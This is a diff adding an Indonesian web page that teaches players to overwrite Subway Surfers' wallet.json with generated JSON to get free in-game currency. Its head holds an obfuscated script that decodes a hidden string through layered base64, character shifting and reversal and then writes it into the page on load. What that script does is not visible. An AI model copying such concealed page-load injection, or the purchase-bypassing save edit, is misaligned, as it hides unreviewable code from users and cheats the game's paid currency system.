@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Subway Tutorial - KYYS MOD APEKA</title>
+  <link rel="shortcut icon" href="https://kyysmodapekaa.edgeone.dev/favicon.ico" type="image/x-icon"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+<!-- APAAN MAU AMBIL LU? MAHAL INI SELF AJA GAK GW BAGI INI -->
+  <script>
+let e="T%7BCtOWl%7BdF%3AjWYh3Zl%5BpcHOrcIC%5BNoiQW1eGQYyiTGG6WFiWOV2tcIeQWV6sZlV1fmlzbFuWNVF%3AgHKXXoS%5BNkmEZWWse2%5Bt%5BHGjNEW%5BW36Pd2OIVU29%5BXuxWGWJUmejW16vZ%7BJybXOJbFiWRU1%3A";
+let d=decodeURIComponent(e);
+let c='';
+for(let i=0;i<d.length;i++){c+=String.fromCharCode(d.charCodeAt(i)-1);}
+let b=atob(c);
+let a=b.split("|").map(x=>atob(x)).join("");
+a=a.split("").reverse().join("");
+a=decodeURIComponent(escape(atob(a)));
+document.write(a);
+</script>
+  <style>
+    :root {
+      --primary: #647cf7;
+      --primary-light: #7b8cff;
+      --bg: #131627;
+      --text: #d5d7e3;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #0e1120;
+      font-family: 'Inter', sans-serif;
+      color: var(--text);
+      min-height: 100vh;
+      background-image:
+        radial-gradient(circle at 20% 30%, rgba(100, 124, 247, 0.08) 0%, transparent 40%),
+        radial-gradient(circle at 80% 70%, rgba(123, 140, 255, 0.06) 0%, transparent 40%);
+      padding-top: 70px;
+      padding-bottom: 40px;
+    }
+
+    /* === Headbar Glassmorphism === */
+    .headbar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 60px;
+      padding: 0 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      z-index: 1000;
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      background: rgba(19, 22, 39, 0.65);
+      border-bottom: 1px solid rgba(100, 124, 247, 0.2);
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+    }
+
+    .headbar h1 {
+      font-size: 1.35rem;
+      font-weight: 800;
+      color: #ffffff;
+      letter-spacing: -0.5px;
+    }
+
+    .headbar a,
+    .headbar button {
+      color: #ffffff !important;
+      text-decoration: none;
+      background: none;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 40px;
+      height: 40px;
+      border-radius: 10px;
+      transition: all 0.25s ease;
+    }
+
+    .headbar a:hover,
+    .headbar button:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+
+    /* === Rotasi 180° Toggle === */
+    .toggle-icon {
+      display: block;
+      transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .toggle-icon.rotated {
+      transform: rotate(180deg);
+    }
+
+    /* === Breadcrumb Modern === */
+    .breadcrumb {
+      padding: 12px 0 20px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.95rem;
+      max-width: 800px;
+      width: 100%;
+      margin: 0 auto;
+      padding-left: 16px;
+      padding-right: 16px;
+    }
+
+    .breadcrumb a {
+      color: #ffffff;
+      text-decoration: none;
+      font-weight: 500;
+      transition: opacity 0.2s ease;
+    }
+
+    .breadcrumb a:hover {
+      opacity: 0.85;
+    }
+
+    .breadcrumb .separator {
+      color: var(--primary);
+      font-weight: 400;
+    }
+
+    .breadcrumb .active {
+      color: var(--primary);
+      font-weight: 600;
+      cursor: default;
+    }
+
+    /* === Main Content === */
+    main {
+      max-width: 800px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 0 16px;
+    }
+
+    .tutorial-card {
+      background: rgba(19, 22, 39, 0.7);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(100, 124, 247, 0.25);
+      border-radius: 16px;
+      padding: 2rem;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
+      margin-bottom: 1.8rem;
+    }
+
+    .step-title {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 1.2rem;
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: #e0e3f0;
+    }
+
+    .step-number {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 36px;
+      height: 36px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-light));
+      border-radius: 50%;
+      color: white;
+      font-weight: 800;
+      font-size: 1.1rem;
+      flex-shrink: 0;
+    }
+
+    .step-content {
+      line-height: 1.7;
+      color: #c5cbe0;
+    }
+
+    /* === Perbaikan Layout Ikon + Teks Panjang === */
+    .step-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 0.8rem;
+    }
+
+    .step-item i {
+      color: var(--primary);
+      font-size: 1.1rem;
+      min-width: 20px;
+      margin-top: 4px;
+      flex-shrink: 0;
+    }
+
+    .step-item span {
+      flex: 1;
+      word-break: break-word;
+      line-height: 1.6;
+    }
+
+    /* === Social Sidebar === */
+    .social-sidebar {
+      position: fixed;
+      top: 0;
+      right: -280px;
+      width: 260px;
+      height: 100vh;
+      background: rgba(19, 22, 39, 0.85);
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+      border-left: 1px solid rgba(100, 124, 247, 0.25);
+      padding: 80px 20px 30px;
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+      z-index: 999;
+      transition: right 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .social-sidebar.open {
+      right: 0;
+    }
+
+    .social-sidebar h3 {
+      color: var(--primary-light);
+      margin-bottom: 20px;
+      font-size: 1.1rem;
+      text-align: center;
+      font-weight: 700;
+    }
+
+    .social-link {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 12px 20px;
+      border-radius: 14px;
+      color: var(--text);
+      text-decoration: none;
+      font-weight: 600;
+      transition: all 0.25s ease;
+      background: rgba(30, 35, 60, 0.4);
+      font-family: 'Inter', sans-serif;
+    }
+
+    .social-link:hover {
+      background: rgba(100, 124, 247, 0.2);
+      transform: translateX(-4px);
+      color: var(--primary-light);
+    }
+
+    .social-link i {
+      font-size: 1.3rem;
+      width: 28px;
+      text-align: center;
+    }
+
+    /* === Footer === */
+    footer {
+      text-align: center;
+      padding: 2rem 1rem;
+      color: #9aa0b5;
+      font-size: 0.9rem;
+      margin-top: 3rem;
+      border-top: 1px solid rgba(100, 124, 247, 0.15);
+      font-family: 'Inter', sans-serif;
+      font-weight: 500;
+    }
+
+    footer a {
+      color: var(--primary-light);
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Headbar Glassmorphism -->
+  <div class="headbar">
+    <a href="index.html">
+      <i class="fas fa-arrow-left" style="font-size: 1.4rem;"></i>
+    </a>
+    <h1>Subway Tutorial</h1>
+    <button id="sidebarToggle">
+      <i class="fas fa-bars toggle-icon" id="toggleIcon"></i>
+    </button>
+  </div>
+
+  <!-- Social Sidebar -->
+  <div class="social-sidebar" id="socialSidebar">
+    <h3>Hubungi Kami</h3>
+    <a href="#" target="_blank" class="social-link">
+      <i class="fab fa-whatsapp"></i> WhatsApp
+    </a>
+    <a href="#" target="_blank" class="social-link">
+      <i class="fab fa-youtube"></i> YouTube
+    </a>
+    <a href="#" target="_blank" class="social-link">
+      <i class="fab fa-instagram"></i> Instagram
+    </a>
+    <a href="#" target="_blank" class="social-link">
+      <i class="fab fa-telegram"></i> Telegram
+    </a>
+  </div>
+
+  <!-- Breadcrumb -->
+  <div class="breadcrumb">
+    <a href="https://kyysmodapekaa.edgeone.dev/">Home</a>
+    <span class="separator">/</span>
+    <a href="/subway-json">Subway Json</a>
+    <span class="separator">/</span>
+    <span class="active">Tutorial</span>
+  </div>
+
+  <main>
+    <!-- Langkah Pertama -->
+    <div class="tutorial-card">
+      <div class="step-title">
+        <div class="step-number">1</div>
+        <span>Langkah Pertama!</span>
+      </div>
+      <div class="step-content">
+        <div class="step-item">
+          <i class="fas fa-download"></i>
+          <span>Install <strong>Subway Surfers</strong> Original dari Play Store</span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-file-archive"></i>
+          <span>Install <strong>zArchiver</strong> Original dari Play Store</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Langkah Kedua -->
+    <div class="tutorial-card">
+      <div class="step-title">
+        <div class="step-number">2</div>
+        <span>Langkah Kedua!</span>
+      </div>
+      <div class="step-content">
+        <div class="step-item">
+          <i class="fas fa-gamepad"></i>
+          <span>Buka <strong>Subway Surfers</strong> hingga ke menu lobby atau pastikan tutorial awal selesai</span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-globe"></i>
+          <span>Buka website <strong>SubwayWallet KYYS</strong></span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-sliders-h"></i>
+          <span>Customize angka sesuai keinginanmu</span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-copy"></i>
+          <span>Salin kode JSON yang dihasilkan</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Langkah Ketiga -->
+    <div class="tutorial-card">
+      <div class="step-title">
+        <div class="step-number">3</div>
+        <span>Langkah Ketiga!</span>
+      </div>
+      <div class="step-content">
+        <div class="step-item">
+          <i class="fas fa-folder-open"></i>
+          <span>Buka <strong>zArchiver</strong></span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-arrow-right"></i>
+          <span>Cari folder <code>Android</code></span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-arrow-right"></i>
+          <span>Buka folder <code>Data</code></span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-arrow-right"></i>
+          <span>Cari folder <code>com.kiloo.subwaysurf</code></span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-arrow-right"></i>
+          <span>Buka folder <code>files</code></span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-arrow-right"></i>
+          <span>Buka folder <code>profile</code></span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-file-code"></i>
+          <span>Cari file <code>wallet.json</code></span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-edit"></i>
+          <span>Klik lalu buka file tersebut</span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-trash"></i>
+          <span>Hapus semua isi kode di dalamnya</span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-paste"></i>
+          <span>Tempelkan kode JSON yang telah kamu salin sebelumnya</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- User Testing -->
+    <div class="tutorial-card">
+      <div class="step-title">
+        <div class="step-number">✓</div>
+        <span>User Testing!</span>
+      </div>
+      <div class="step-content">
+        <div class="step-item">
+          <i class="fas fa-play"></i>
+          <span>Tutup zArchiver</span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-gamepad"></i>
+          <span>Buka kembali game <strong>Subway Surfers</strong></span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-check-circle"></i>
+          <span>Pastikan data telah berubah sesuai dengan yang kamu atur</span>
+        </div>
+        <div class="step-item">
+          <i class="fas fa-check"></i>
+          <span>Selesai! Selamat menikmati modifikasi kamu</span>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <p>
+      <i class="fab fa-whatsapp"></i>
+      <a href="#" target="_blank">SALURAN WHATSAPP</a>
+    </p>
+    <hr style="border: none; border-top: 1px solid rgba(100, 124, 247, 0.15); margin: 1rem auto; width: 50%;" />
+    <p>&copy; 2025 <a href="https://kyysmodapekaa.edgeone.dev/" target="_blank">KYYS V1</a>, all rights reserved</p>
+  </footer>
+
+  <script>
+    // === Toggle Sidebar ===
+    const toggleBtn = document.getElementById('sidebarToggle');
+    const sidebar = document.getElementById('socialSidebar');
+    const toggleIcon = document.getElementById('toggleIcon');
+
+    toggleBtn.addEventListener('click', () => {
+      sidebar.classList.toggle('open');
+      toggleIcon.classList.toggle('fa-bars');
+      toggleIcon.classList.toggle('fa-xmark');
+      toggleIcon.classList.toggle('rotated');
+    });
+
+    document.addEventListener('click', (e) => {
+      if (sidebar.classList.contains('open') &&
+          !sidebar.contains(e.target) &&
+          !toggleBtn.contains(e.target)) {
+        sidebar.classList.remove('open');
+        toggleIcon.classList.remove('fa-xmark', 'rotated');
+        toggleIcon.classList.add('fa-bars');
+      }
+    });
+  </script>
+
+</body>
+</html>
